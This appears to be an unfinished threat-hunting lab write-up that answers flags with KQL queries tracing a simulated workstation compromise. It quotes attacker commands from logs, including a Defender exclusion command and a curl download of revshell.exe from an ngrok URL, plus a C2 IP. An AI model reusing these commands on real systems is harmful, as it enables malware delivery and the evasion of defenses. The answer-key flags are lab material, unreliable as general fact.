# Threat-Hunting-Scenario-CorpHealth-Traceback

## RDP Compromise Incident

**Report ID:** INC-2025-

**Analyst:** Nadezna Morris

**Date:** 16-December-2025

**Incident Date:** 24-November-2025

---

## Executive Summary


---

## 1. Findings

### **Key Indicators of Compromise (IOCs):**

| Indicator                                                            | Description                  |
| -------------------------------------------------------------------- | -----------------------------|

---

***FLAG 0: Identify the device***

**Objective:** Your first step is confirming which workstation generated the unusual telemetry. Initial log clustering shows that all suspicious events originated from a single endpoint active during an off-hours window in the middle of November. Multiple entries with sources tied to Process Events, Network Events,File Events and Script-based operations

**Flag:** `ch-ops-wks02`
```
DeviceProcessEvents
| where AccountName has_any ("corphealth")
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="955" height="100" alt="image" src="https://github.com/user-attachments/assets/a14dd5af-0f95-410e-b980-b89f76182b9c" />

---

***FLAG 1: Unique Maintenance File***

**Objective:** CorpHealth uses a mix of scheduled scripts and diagnostic utilities across multiple endpoints. Most of them are standard, repeated across many machines. But one script on CH-OPS-WKS02 appears to be unique to this host, tied to recent maintenance work. As an analyst, you want to know which “maintenance” file stands out here before treating any behavior as normal.

**Flag:** `MaintenanceRunner_Distributed.ps1`
```
DeviceFileEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-15))
| where FileName endswith ".ps1"
   or FileName endswith ".bat"
   or FileName endswith ".cmd"
   or FileName endswith ".vbs"
| where FileName !startswith "__PSScriptPolicyTest_"
| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc 
```
<img width="807" height="74" alt="image" src="https://github.com/user-attachments/assets/e5c194d8-a31c-4dc9-bc9b-a8af06111c39" />

---

***FLAG 2: Outbound beacon indicator***

**Objective:** Determine when the maintenance script first initiated outbound communication. (e.g. Timestamp)

**Flag:** `2025-11-23T03:46:08.400686Z`
```
DeviceNetworkEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| where InitiatingProcessCommandLine has "MaintenanceRunner_Distributed.ps1"
| project TimeGenerated, DeviceName, ActionType, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
<img width="1262" height="82" alt="image" src="https://github.com/user-attachments/assets/787d8d06-0971-430d-aa70-daadd035118f" />

---

***FLAG 3: Identify the Beacon Destination***

**Objective:** Your task is to examine the network telemetry associated with the script execution and extract the actual network destination the host attempted to reach. This beacon traffic is your first concrete IOC leading off-host. What Remote IP and port did CH-OPS-WKS02 attempt to connect to during the beacon event?

**Flag:** `127.0.0.1:8080`
```
DeviceNetworkEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| where InitiatingProcessCommandLine has "MaintenanceRunner_Distributed.ps1"
| project TimeGenerated, DeviceName, ActionType, InitiatingProcessCommandLine, RemoteIP, RemotePort
| order by TimeGenerated asc
```
<img width="900" height="76" alt="image" src="https://github.com/user-attachments/assets/3afe7b29-57f3-4d3c-890b-0905701ba2d1" />

---

***FLAG 4: Confirm the Successful Beacon Timestamp***

**Objective:** What is the most recent (latest) timestamp where CH-OPS-WKS02 successfully connected (ConnectionSuccess) to the beacon IP and port?

**Flag:** `2025-11-30T01:03:17.6985973Z`
```
DeviceNetworkEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| where InitiatingProcessCommandLine has "MaintenanceRunner_Distributed.ps1"
| where ActionType == "ConnectionSuccess"
| project TimeGenerated, DeviceName, ActionType, InitiatingProcessCommandLine, RemoteIP, RemotePort
| order by TimeGenerated desc 
```
<img width="931" height="72" alt="image" src="https://github.com/user-attachments/assets/d6433d98-0a5d-4021-99a2-8b67c16ecc1c" />

---

***FLAG 5 — Unexpected Staging Activity Detected***

**Objective:** Determine exactly what artifacts the attacker staged. This will help you understand what they intended to take — or alter. What is the full file path of the First primary staging artifact created during the attack?

**Flag:** `C:\ProgramData\Microsoft\Diagnostics\CorpHealth\inventory_6ECFD4DF.csv`
```
DeviceFileEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| where ActionType == "FileCreated"
| where FolderPath has_any ("Diagnostics", "CorpHealth")
| project TimeGenerated, DeviceName, FolderPath, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
<img width="1197" height="85" alt="image" src="https://github.com/user-attachments/assets/1d1d143d-b237-41b4-8b3c-50cf9b0e9033" />

---

***FLAG 6 — Confirm the Staged File’s Integrity***

**Objective:** Your next step is to verify the file’s cryptographic fingerprint. What is the SHA-256 hash of the staged file you identified in the previous flag?

**Flag:** `7f6393568e414fc564dad6f49a06a161618b50873404503f82c4447d239f12d8`
```
DeviceFileEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| where FolderPath has "inventory_6ECFD4DF.csv"
| project TimeGenerated, DeviceName, FolderPath, SHA256
| order by TimeGenerated asc
```
<img width="1125" height="85" alt="image" src="https://github.com/user-attachments/assets/5cc162ba-7a59-4dd5-b86c-e910809de6d9" />

---

***FLAG 7 — Identify the Duplicate Staged Artifact***

**Objective:** It looks like another file exists that is:
- Very similar in name
- Roughly the same size
- Written around the same timeframe
- BUT has a different SHA-256 hash
- AND is located in a different 
This is almost certainly an attacker “working copy” or alternate staging location. What is the full file path of the second file?

**Flag:** `C:\Users\ops.maintenance\AppData\Local\Temp\CorpHealth\inventory_tmp_6ECFD4DF.csv`
```
DeviceFileEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| where InitiatingProcessCommandLine has "MaintenanceRunner_Distributed.ps1"
| project TimeGenerated, DeviceName, FolderPath, SHA256
| order by TimeGenerated asc
```
<img width="1158" height="82" alt="image" src="https://github.com/user-attachments/assets/264dd959-20b3-4039-b9ea-ebb7cc879ed2" />

---

***FLAG 8 — Suspicious Registry Activity***

**Objective:** Analysts reviewing the event timeline notice that a suspicious PowerShell script attempted to inspect or tamper with system configuration. One registry key stands out as anomalous and directly tied to the attacker’s “Credential Harvesting Simulation” stage. Which exact registry key was created or touched during this activity?

**Flag:** `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\EventLog\Application\CorpHealthAgent`
```
DeviceRegistryEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| where ActionType == "RegistryKeyCreated"
| where InitiatingProcessCommandLine has "MaintenanceRunner_Distributed.ps1"
| project TimeGenerated, DeviceName, RegistryKey, RegistryValueData
| order by TimeGenerated asc
```
<img width="937" height="72" alt="image" src="https://github.com/user-attachments/assets/54676d5f-ea6c-47fc-84fc-2c208de60ec3" />

---

***FLAG 9 — Scheduled Task Persistence***

**Objective:** Even though some attempts may have failed due to permission issues, at least one scheduled task was successfully created earlier in the investigation window. This task is not part of CorpHealth’s standard approved tasks and represents an unauthorized persistence mechanism. Which Scheduled Task Did the Attacker First Create?

**Flag:** `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\CorpHealth_A65E64`
```
DeviceRegistryEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| where ActionType has_any ("RegistryKeyCreated", "RegistryValueSet")
| where RegistryKey has_any ("CorpHealth")
| project TimeGenerated, DeviceName, ActionType, RegistryKey, RegistryValueName
| order by TimeGenerated asc
```
<img width="1456" height="92" alt="image" src="https://github.com/user-attachments/assets/e8e1af38-0390-4723-9a19-6c423ab7f385" />

---

***FLAG 10 - Registry-based Persistence***

**Objective:** This pattern is intentional—it resembles ephemeral persistence, meant to survive a single reboot or login, trigger once, and then erase its tracks. Identify which value name was created. What Registry Value Name Was Added to the Run Key?

**Flag:** `MaintenanceRunner`
```
DeviceRegistryEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| where ActionType has_any ("RegistryKeyCreated", "RegistryValueSet","RegistryKeyDeleted")
| where RegistryKey has @"\Software\Microsoft\Windows\CurrentVersion\Run"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName
| order by TimeGenerated desc 
```
<img width="970" height="72" alt="image" src="https://github.com/user-attachments/assets/d8d27737-33e2-487d-a67c-51bc64ba60cf" />

---

***FLAG 11 — Privilege Escalation Event Timestamp***

**Objective:** During the intrusion, the attacker executed a simulated privilege-escalation action inside the MaintenanceRunner sequence. Locate the exact Timestamp (UTC) of the FIRST ConfigAdjust privilege-escalation event.

**Flag:** `2025-11-23T03:47:21.8529749Z`
```
DeviceEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
| where AdditionalFields has "ConfigAdjust"
| project TimeGenerated, ActionType, AdditionalFields
| sort by TimeGenerated asc
```
<img width="927" height="72" alt="image" src="https://github.com/user-attachments/assets/84940aee-0bf7-4d5c-9a87-3bbae2f495ac" />

---

***FLAG 12 — Identify the AV Exclusion Attempt***

**Objective:** Your investigation reveals that the attacker attempted to modify Windows Defender settings to exclude a specific folder from real-time scanning. What folder path did the attacker attempt to add as an exclusion in Windows Defender?

**Flag:** `"cmd.exe" /c echo powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath C:\ProgramData\Corp\Ops\staging -Force > ".cli"`
```
DeviceProcessEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-25) .. datetime(2025-12-13))
| where ProcessCommandLine has_any ("ExclusionPath")
| project TimeGenerated, ActionType, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="1195" height="85" alt="image" src="https://github.com/user-attachments/assets/c0d29e32-6929-4a4f-a8e3-210eb0c0fec4" />

---

***FLAG 13 — PowerShell Encoded Command Execution***

**Objective:** During the intrusion, a PowerShell process executed using the -EncodedCommand flag. What decoded PowerShell command was executed First?

**Flag:** `Write-Output 'token-6D5E4EE08227'`
```
DeviceProcessEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-13))
| where AccountName !in ("SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE")
| where ProcessCommandLine has "-EncodedCommand"
| extend Enc = extract(@"-EncodedCommand\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
| extend Decoded = base64_decode_tostring(Enc)
| project TimeGenerated, AccountName, ProcessCommandLine, Decoded
| sort by TimeGenerated asc
```
<img width="942" height="77" alt="image" src="https://github.com/user-attachments/assets/6662dcb3-e19e-4ef5-94d8-f175eacf37c0" />

---

***Flag 14 — Privilege Token Modification***

**Objective:** Windows recorded a ProcessPrimaryTokenModified event, a behavior consistent with attackers attempting to escalate privileges or adjust token integrity to blend in with SYSTEM-level processes. Which process actually performed that token modification? What is the "InitiatingProcessId" of the process whose token privileges were modified?

**Flag:** `4888`
```
DeviceEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-13))
| where AdditionalFields has_any ("tokenChangeDescription", "Privileges were added")
| project TimeGenerated, AdditionalFields, InitiatingProcessId
| order by TimeGenerated asc
```
<img width="957" height="72" alt="image" src="https://github.com/user-attachments/assets/848ac182-7495-4f5b-914a-27f48c4b0e62" />

---

***FLAG 15 - Whose Token Was Modified?***

**Objective:** If an attacker is adjusting privileges on the local Administrator token, that significantly raises the risk profile of any follow-on activity. Which security identifier (SID) did the modified token belong to?

**Flag:** `S-1-5-21-1605642021-30596605-784192815-1000`
```
DeviceEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-13))
| where AdditionalFields has_any ("tokenChangeDescription", "Privileges were added")
| extend ParsedFields = parse_json(AdditionalFields)
| extend OriginalTokenUserSid = tostring(ParsedFields.OriginalTokenUserSid)
| project TimeGenerated, OriginalTokenUserSid, InitiatingProcessId, AdditionalFields
| order by TimeGenerated asc
```
<img width="1010" height="72" alt="image" src="https://github.com/user-attachments/assets/e7a2cb22-ab53-4712-935d-7477bdd99af0" />

---

***FLAG 16 – Ingress Tool Transfer from External Dynamic Tunnel***

**Objective:** After the privilege escalation, Defender recorded a new executable being written to disk on CH-OPS-WKS02. The timing and location of this file suggest it was delivered as staging material for follow-on activity. Your job is to identify the exact filename the attacker introduced. What is the name of the executable that was written to disk after the outbound request?

**Flag:** `"curl.exe" -o revshell.exe https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe`
```
DeviceFileEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-13))
| where InitiatingProcessCommandLine has_any ("curl.exe")
| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
<img width="1007" height="102" alt="image" src="https://github.com/user-attachments/assets/46007b79-3b40-4745-a805-9daca9711403" />

---

***FLAG 17 — Identify the External Download Source***

**Objective:** Before the suspicious file appeared on the workstation, the host reached out to an external dynamic-tunnel domain using curl.exe. This outbound request fetched the executable later used in post-escalation activity. Identify the exact remote URL involved in this transfer. What URL did the workstation connect to when retrieving the file?

**Flag:** `https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe`
```
DeviceFileEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-13))
| where InitiatingProcessCommandLine has_any ("curl.exe")
| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
<img width="1007" height="102" alt="image" src="https://github.com/user-attachments/assets/46007b79-3b40-4745-a805-9daca9711403" />

---

***FLAG 18 — Execution of the Staged Unsigned Binary***

**Objective:** Shortly after the file was retrieved from the external tunnel, Defender recorded its execution on CH-OPS-WKS02. The binary did not originate from any trusted software distribution channel and was launched directly from the user’s profile directory. This execution event marks the attacker’s shift from staging to actively running their tooling. Which process executed the downloaded binary on CH-OPS-WKS02?

**Flag:** `explorer.exe`
```
DeviceFileEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-12-02) .. datetime(2025-12-13))
| where FileName == "windowsdefender--threat-.lnk"
| project TimeGenerated, DeviceName, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
<img width="927" height="92" alt="image" src="https://github.com/user-attachments/assets/7fdb902c-6c40-49e3-9fea-054f9e85ac93" />

---

***FLAG 19 — Identify the External IP Contacted by the Executable***

**Objective:** After execution on CH-OPS-WKS02, the downloaded binary attempted to initiate outbound communication to an external endpoint. Defender logged multiple failed TCP connection attempts to a remote IP on a high-nonstandard port. This traffic does not match any approved services and was initiated directly by the suspicious executable. What external IP address did the executable attempt to contact after execution?

**Flag:** `13.228.171.119`
```
DeviceNetworkEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-12-02) .. datetime(2025-12-13))
| where RemotePort == 11746
| project TimeGenerated, DeviceName, RemoteIP, RemotePort, LocalPort, RemoteUrl
| order by TimeGenerated asc
```
<img width="565" height="77" alt="image" src="https://github.com/user-attachments/assets/206bbad5-8503-45d2-abc8-1259d49a745c" />

---

***Flag 20 — Persistence via Startup Folder Placement***

**Objective:** After the downloaded binary executed and attempted outbound communication, Defender recorded another file event involving the same executable. The file was copied into a Windows Startup directory — a location frequently abused by attackers for simple persistence. Anything placed in this directory launches automatically at user logon. Which folder path did the attacker use to establish persistence for the executable?

**Flag:** `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\revshell.exe`
```
DeviceFileEvents
| where DeviceName == "ch-ops-wks02"
| where TimeGenerated between (datetime(2025-12-02) .. datetime(2025-12-13))
| where FolderPath has_any ("Start")
| project TimeGenerated, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
<img width="1207" height="86" alt="image" src="https://github.com/user-attachments/assets/3008ac36-5b94-4c3a-b35d-dcbaf5b71ed1" />

---

**Objective:**

**Flag:**


**Objective:**

**Flag:**


**Objective:**

**Flag:**


**Objective:**

**Flag:**


**Objective:**

**Flag:**


**Objective:**

**Flag:**


**Objective:**

**Flag:**


**Objective:**

**Flag:**


**Objective:**

**Flag:**


**Objective:**

**Flag:**
